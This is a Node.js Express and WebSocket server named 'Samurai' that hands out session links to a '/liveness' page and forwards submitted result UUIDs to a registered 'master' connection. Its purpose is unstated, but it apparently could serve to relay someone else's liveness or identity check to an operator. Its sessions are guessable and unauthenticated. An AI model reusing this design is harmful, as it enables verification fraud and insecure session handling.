const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');

const PORT = process.env.PORT || 8080;

const app = express();
app.use(cors());
app.use(express.json());

const masters = {};

app.get('/api/generate_link', (req, res) => {
    const sessionId = Math.floor(100000 + Math.random() * 900000).toString();
    const protocol = req.headers['x-forwarded-proto'] || 'http';
    const clientLink = `${protocol}://${req.get('host')}/liveness?session_id=${sessionId}`;

    res.json({
        success: true,
        session_id: sessionId,
        link: clientLink
    });
});

app.get('/liveness', (req, res) => {
    res.send('<html><head><title>Samurai Secure</title></head><body id="samurai-canvas"></body></html>');
});

app.post('/api/submit', (req, res) => {
    try {
        const data = req.body;
        const targetSession = data.session_id;

        if (targetSession && masters[targetSession]) {
            const masterWs = masters[targetSession];
            
            if (masterWs.readyState === WebSocket.OPEN) {
                let messageToMaster = null;

                if (data.type) {
                    messageToMaster = {
                        type: data.type,
                        reason: data.reason || null
                    };
                    console.log(`📢 [EVENT] ${data.type} for Session: ${targetSession}`);
                } 
                else if (data.payload) {
                    const decoded = Buffer.from(data.payload, 'base64').toString();
                    const jsonPayload = JSON.parse(decoded);
                    const uuid = jsonPayload.result;

                    messageToMaster = {
                        type: 'UUID_RECEIVED',
                        uuid: uuid
                    };
                    console.log(`🚀 [SUCCESS] UUID Received for Session: ${targetSession}`);
                }

                if (messageToMaster) {
                    masterWs.send(JSON.stringify(messageToMaster));
                    return res.json({ success: true, forwarded: true });
                }
            }
        }
        res.json({ success: false, message: "No master to receive data" });

    } catch (e) {
        console.error("Payload Error:", e);
        res.status(400).json({ error: "Bad Request" });
    }
});

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

wss.on('connection', (ws) => {
    let mySessionId = null;

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'REGISTER_MASTER' && data.session_id) {
                mySessionId = data.session_id;
                masters[mySessionId] = ws;
                console.log(`👨‍💻 [MASTER REGISTERED] ID: ${mySessionId}`);
            }
        } catch(e) {}
    });

    ws.on('close', () => {
        if (mySessionId && masters[mySessionId]) {
            delete masters[mySessionId];
            console.log(`🔌 [MASTER DISCONNECTED] Room ${mySessionId} cleaned.`);
        }
    });
});

server.listen(PORT, () => {
    console.log(`🚀 SAMURAI SERVER RUNNING ON PORT ${PORT}`);
});
